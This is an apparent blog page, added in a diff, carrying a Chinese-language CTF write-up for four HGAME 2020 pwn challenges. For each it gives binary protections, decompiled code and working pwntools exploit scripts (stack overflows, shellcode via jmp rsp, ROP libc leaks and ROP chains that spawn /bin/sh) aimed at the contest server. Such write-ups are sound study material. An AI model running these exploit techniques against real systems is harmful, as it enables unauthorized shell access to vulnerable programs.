@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="UTF-8" /><title>PureWeb Blog</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="/TestRepo/github.css"><link rel="stylesheet" href="/TestRepo/speciou.css"></head>
+<body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/TestRepo/">Joe1sn&apos;s Blog</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link active" href="/TestRepo/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/TestRepo/archives/"target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"target="_blank">GITHUB</a></li></ul></nav></header></div><div id="write" class>
+<div id="write" class>
+<p><strong>2020-9-21 16:44</strong></p>
+<p>官方wp链接：<a href="https://github.com/vidar-team/Hgame2020_writeup">https://github.com/vidar-team/Hgame2020_writeup</a></p>
+<!-- more -->
+<h2>1.Hard_AAAAA</h2>
+<ul>
+<li>1.check</li>
+</ul>
+<pre><code class="language-bash">[*] '/mnt/c/Users/13013/Desktop/HGAME/pwn/week1/Hard_AAAAA/Hard'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<ul>
+<li>2.IDA</li>
+</ul>
+<p><strong>main</strong></p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+0h] [ebp-ACh]
+  char v5; // [esp+7Bh] [ebp-31h]
+  unsigned int v6; // [esp+A0h] [ebp-Ch]
+  int *v7; // [esp+A4h] [ebp-8h]
+
+  v7 = &amp;argc;
+  v6 = __readgsdword(0x14u);
+  alarm(0x1Eu);
+  setbuf(_bss_start, 0);
+  memset(&amp;s, 0, 0xA0u);
+  puts(&quot;Let's 0O0o\\0O0!&quot;);
+  gets(&amp;s);
+  if ( !memcmp(&quot;0O0o&quot;, &amp;v5, 7u) )
+    backdoor();
+  return 0;
+}
+</code></pre>
+<p><strong>backdoor</strong></p>
+<pre><code class="language-c">int backdoor()
+{
+  return system(&quot;/bin/sh&quot;);
+}
+</code></pre>
+<blockquote>
+<p>发现是“0O0o”和v5比较前7个字节，但是我们输入的是s,应该可以栈覆盖</p>
+</blockquote>
+<p><strong>栈（s,v5）</strong></p>
+<pre><code class="language-c">  -000000AC ; D/A/*   : change type (data/ascii/array)
+  -000000AC ; N       : rename
+  -000000AC ; U       : undefine
+  -000000AC ; Use data definition commands to create local variables and function arguments.
+  -000000AC ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.
+  -000000AC ; Frame size: AC; Saved regs: 4; Purge: 0
+  -000000AC ;
+  -000000AC
+  -000000AC s               db ?
+  -000000AB                 db ? ; undefined
+  -000000AA                 db ? ; undefined
+  -000000A9                 db ? ; undefined
+........................
+  -00000031                 db ? ; v5_addr
+</code></pre>
+<p>0xAC --&gt; 0xC : s的栈空间</p>
+<p>0x31：v5</p>
+<p>所以s覆盖到v5就可了，但是比较7个字节</p>
+<p><strong>十六进制</strong></p>
+<p>080486E0 ： db '0O0o'</p>
+<p><strong>080486E0</strong></p>
+<p><strong>30 4F 30 6F 00 4F 30 00  2F 62 69 6E 2F 73 68 00</strong></p>
+<p><strong>0O0o.O0./bin/sh.</strong></p>
+<p>所以要输入“\x30\x4F\x30\x6F\x00\x4F\x30”</p>
+<ul>
+<li>3.EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+context.log_level = &quot;debug&quot;
+p = remote(&quot;47.103.214.163&quot;,20000)
+#p = process(&quot;./Hard&quot;)
+string_addr = 0x080486E0
+payload = &quot;a&quot;*(0xAC-0x31)+&quot;\x30\x4F\x30\x6F\x00\x4F\x30&quot;
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2>2.Number_Killer</h2>
+<ul>
+<li>1.check</li>
+</ul>
+<pre><code class="language-bash">[*] '/mnt/c/Users/13013/Desktop/HGAME/pwn/week1/Number_Killer/Number_Killer'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre>
+<p>无保护？估计要传shellcode</p>
+<ul>
+<li>2.IDA</li>
+</ul>
+<p><strong>main</strong></p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v4[11]; // [rsp+0h] [rbp-60h]
+  int i; // [rsp+5Ch] [rbp-4h]
+
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  memset(v4, 0, 0x50uLL);
+  puts(&quot;Let's Pwn me with numbers!&quot;);
+  for ( i = 0; i &lt;= 19; ++i )
+    v4[i] = readll();
+  return 0;
+}
+</code></pre>
+<p><strong>readll</strong></p>
+<pre><code class="language-c">__int64 readll()
+{
+  char nptr[8]; // [rsp+0h] [rbp-20h]
+  __int64 v2; // [rsp+8h] [rbp-18h]
+  int v3; // [rsp+10h] [rbp-10h]
+  int v4; // [rsp+18h] [rbp-8h]
+  int i; // [rsp+1Ch] [rbp-4h]
+
+  *(_QWORD *)nptr = 0LL;
+  v2 = 0LL;
+  v3 = 0;
+  v4 = 0;
+  for ( i = 0; read(0, &amp;nptr[i], 1uLL) &gt; 0 &amp;&amp; i &lt;= 19 &amp;&amp; nptr[i] != 10; ++i )
+    ;
+  return atoll(nptr);
+}
+</code></pre>
+<p><strong>gift</strong></p>
+<pre><code class="language-assembly">.text:0000000000400789 ; =============== S U B R O U T I N E =======================================
+.text:0000000000400789
+.text:0000000000400789 ; Attributes: bp-based frame
+.text:0000000000400789
+.text:0000000000400789                 public gift
+.text:0000000000400789 gift            proc near
+.text:0000000000400789 ; __unwind {
+.text:0000000000400789                 push    rbp
+.text:000000000040078A                 mov     rbp, rsp
+.text:000000000040078D                 jmp     rsp
+.text:000000000040078D gift            endp
+</code></pre>
+<blockquote>
+<p>关于atoll</p>
+<p><a href="http://www.cplusplus.com/reference/cstdlib/atoll/">atoll - C++ Reference</a></p>
+</blockquote>
+<blockquote>
+<p>总之就是栈溢出后传入shellcode，但是数的大小会影响循环的次数</p>
+<p>修改ret,就改为0xc00000000之类的（补码位溢出）,jmp rsp跳转执行shellcode</p>
+</blockquote>
+<ul>
+<li>3.EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import *
+#context.log_level = &quot;debug&quot;
+p = remote(&quot;47.103.214.163&quot;,20001)
+#p = process(&quot;./Number_killer&quot;)
+p.recvuntil('!')
+for i in range(12):
+	p.sendline('51539607552')
+p.sendline('4196237')#jmp rsp
+p.sendline('7955998173871797809')
+p.sendline('6869206962231521071')
+p.sendline('1424770328968042')
+p.sendline('0')
+p.sendline('0')
+p.sendline('0')
+p.interactive()
+</code></pre>
+<p><strong>参考<a href="https://bbs.pediy.com/thread-257377.htm">[原创]2020HGAME Week1 Pwn WP</a></strong></p>
+<h2>3.One_Shot</h2>
+<ul>
+<li>1.check</li>
+</ul>
+<pre><code class="language-bash">[*] '/mnt/c/Users/13013/Desktop/HGAME/pwn/week1/One_Shot/One_Shot'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<ul>
+<li>2.IDA</li>
+</ul>
+<p><strong>main</strong></p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  _BYTE *v4; // [rsp+8h] [rbp-18h]
+  int fd[2]; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v6; // [rsp+18h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  v4 = 0LL;
+  *(_QWORD *)fd = open(&quot;./flag&quot;, 0, envp);
+  setbuf(stdout, 0LL);
+  read(fd[0], &amp;flag, 0x1EuLL);
+  puts(&quot;Firstly....What's your name?&quot;);
+  __isoc99_scanf(&quot;%32s&quot;, &amp;name);
+  puts(&quot;The thing that could change the world might be a Byte!&quot;);
+  puts(&quot;Take tne only one shot!&quot;);
+  __isoc99_scanf(&quot;%d&quot;, &amp;v4);
+  *v4 = 1;
+  puts(&quot;A success?&quot;);
+  printf(&quot;Goodbye,%s&quot;, &amp;name);
+  return 0;
+}
+</code></pre>
+<p><strong>bss段</strong></p>
+<pre><code class="language-assembly">bss:00000000006010C0                 public name
+.bss:00000000006010C0 name            db    ? ;             
+.bss:00000000006010C0                                       
+.bss:00000000006010C1                 db    ? ;
+.bss:00000000006010C2                 db    ? ;
+.bss:00000000006010C3                 db    ? ;
+.bss:00000000006010C4                 db    ? ;
+.bss:00000000006010C5                 db    ? ;
+....................
+.bss:00000000006010DF                 db    ? ;
+.bss:00000000006010E0                 public flag
+.bss:00000000006010E0 flag            db    ? ;               ; DATA XREF: main+56↑o
+.bss:00000000006010E1                 db    ? ;
+.bss:00000000006010E2                 db    ? ;
+.bss:00000000006010E3                 db    ? ;
+....................
+.bss:0000000000601107 _bss            ends
+</code></pre>
+<p>scanf输入以'\x00'截断，用v4指针跳转地址，修改'\x00'为'\x01'，最后和name一起输出flag</p>
+<ul>
+<li>3.EXP</li>
+</ul>
+<pre><code class="language-python">from pwn import * 
+p = remote('47.103.214.163',20002)
+#context.log_level = &quot;debug&quot;
+
+payload = 'a'*(0xE0-0xC0-1)
+p.sendlineafter('?',payload)
+p.sendlineafter('!',str(6295775))#0x6010DF=6295775
+p.interactive()
+</code></pre>
+<h2>4.ROP_LEVEL0</h2>
+<ul>
+<li>1.check</li>
+</ul>
+<pre><code class="language-bash">[*] '/mnt/c/Users/13013/Desktop/HGAME/pwn/week1/ROP_LEVEL0/ROP_LEVEL0'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<ul>
+<li>2.IDA</li>
+</ul>
+<p><strong>main</strong></p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  char buf; // [rsp+0h] [rbp-50h]
+  int v6; // [rsp+38h] [rbp-18h]
+  int fd[2]; // [rsp+48h] [rbp-8h]
+
+  memset(&amp;buf, 0, 0x38uLL);
+  v6 = 0;
+  setbuf(_bss_start, 0LL);
+  v3 = open(&quot;./some_life_experience&quot;, 0);
+  *(_QWORD *)fd = v3;
+  read(v3, &amp;buf, 0x3CuLL);
+  puts(&amp;buf);
+  read(0, &amp;buf, 0x100uLL);
+  return 0;
+}
+</code></pre>
+<p><strong>vuln</strong></p>
+<pre><code class="language-c">__int64 vuln()
+{
+  char buf; // [rsp+0h] [rbp-10h]
+
+  read(0, &amp;buf, 0xA0uLL);
+  return 0LL;
+}
+</code></pre>
+<h3>4.1 libc_leak(ret2csu)</h3>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+context.log_level = 'debug'
+p = remote('47.103.214.163',20003)
+elf = ELF('ROP_LEVEL0')
+#libc = ELF('libc-2.27.so')
+
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+vuln_addr = 0x0400636
+
+pop_rdi_ret = 0x0400753
+
+
+payload_1 = 'a'*(0x50+8)
+payload_1 += p64(vuln_addr)
+
+payload_2 = 'a'*(0x10+8)
+payload_2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)
+
+p.recvuntil(&quot;./flag&quot;)
+p.sendline(payload_1)
+p.sendline(payload_2)
+p.recvuntil('\n')
+puts_real = u64(p.recv(6).ljust(8,'\x00'))
+libc = LibcSearcher(&quot;puts&quot;,puts_real)
+libc_base = puts_real - libc.dump('puts')
+
+sys_addr = libc_base + libc.dump('system')
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+
+payload_3 = 'a'*(0x10+8)
+payload_3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(0)
+p.sendline(payload_3)
+p.interactive()
+</code></pre>
+<blockquote>
+<p>libc版本：ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</p>
+</blockquote>
+<p>其实就是一个简单的libc_leak,不知到当时为啥没解出来</p>
+<h3>4.2官方预期解：读取flag</h3>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+p = remote('47.103.214.163',20003)
+elf = ELF(&quot;ROP_LEVEL0&quot;)
+'''
+Gadgets information
+============================================================
+0x000000000040074c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040074e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400750 : pop r14 ; pop r15 ; ret
+0x0000000000400752 : pop r15 ; ret
+0x000000000040074b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040074f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004005a0 : pop rbp ; ret
+0x0000000000400753 : pop rdi ; ret
+0x0000000000400751 : pop rsi ; pop r15 ; ret
+0x000000000040074d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004004c9 : ret
+0x0000000000400532 : ret 0x200a
+0x000000000040067e : ret 0x4804
+'''
+pop_rsi_r15_ret = 0x0000000000400751
+pop_rdi_ret = 0x0000000000400753
+read_plt = elf.plt['read']
+open_plt = elf.plt['open']
+puts_plt = elf.plt['puts']
+buf_addr = 0x601060#参考read的参数，要一个类似指针的buf
+
+payload = 'a'*(0x50+8)
+	#栈溢出
+payload += p64(pop_rsi_r15_ret)+p64(buf_addr)+p64(0)
+	#buf值存入64位第二个传参寄存器rsi
+payload += p64(read_plt)+p64(pop_rdi_ret)+p64(buf_addr)+p64(pop_rsi_r15_ret)+p64(0)*2
+	#调用read并填入参数
+payload += p64(open_plt)+p64(pop_rdi_ret)+p64(4)+p64(pop_rsi_r15_ret)+p64(buf_addr)*2
+	#调用open并填入参数
+payload += p64(read_plt)+p64(pop_rdi_ret)+p64(buf_addr)+p64(puts_plt)
+	#再次调用read读取flag
+p.sendline(payload)
+p.sendline('./flag\x00')
+p.interactive()
+</code></pre>
+
+</div>
+</div></body></html>
